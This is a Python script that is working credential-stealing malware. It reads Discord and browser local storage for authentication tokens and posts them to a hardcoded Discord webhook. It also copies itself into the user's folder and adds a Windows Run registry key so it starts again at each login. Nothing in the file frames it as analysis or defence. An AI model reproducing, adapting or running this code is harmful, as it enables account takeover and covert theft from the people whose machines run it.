
import os
import json
import os
import re
import shutil
import winreg
from urllib.request import Request, urlopen

PAYLOAD_PATH = os.path.realpath(__file__)
WEBHOOK_URL = "https://discordapp.com/api/webhooks/1096583749145215019/Zjj9diUlfEGGy86CrZujdBtvmmNlm4M8uSnpG2l7UCyEd-yEKAAcrTU7s8p7UQnJFrrt"


def set_autostart_registry(app_name, key_data=None, autostart=True) -> bool:
    with winreg.OpenKey(
        key=winreg.HKEY_CURRENT_USER,
        sub_key=r"Software\Microsoft\Windows\CurrentVersion\Run",
        reserved=0,
        access=winreg.KEY_ALL_ACCESS
    ) as key:
        try:
            if autostart:
                winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, key_data)
            else:
                winreg.DeleteValue(key, app_name)
        except OSError:
            return False
    return True


def find_tokens(path) -> list:
    path += "\\Local Storage\\leveldb"
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
    
        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    
    return tokens


def main():
    local = os.getenv("LOCALAPPDATA")
    roaming = os.getenv("APPDATA")
    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }
    message = "@everyone"
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
    
        message += f"\n**{platform}**\n"
        tokens = find_tokens(path)
        if len(tokens) > 0:
            for token in tokens:
                message += f"{token}\n"
        else:
            message += "No tokens found.\n"
        
        message += "\n"
    
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    payload = json.dumps({"content": message})
    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass


if __name__ == "__main__":
    path = fr"C:\Users\{os.getenv('username')}\test"
    if not os.path.isdir(path):
        os.mkdir(path)
    file = "hi.pyw"
    try:
        shutil.copy(__file__, f"{path}\{file}")
    except shutil.SameFileError:
        pass
    set_autostart_registry("Osiris", f"{path}\{file}")
    main()
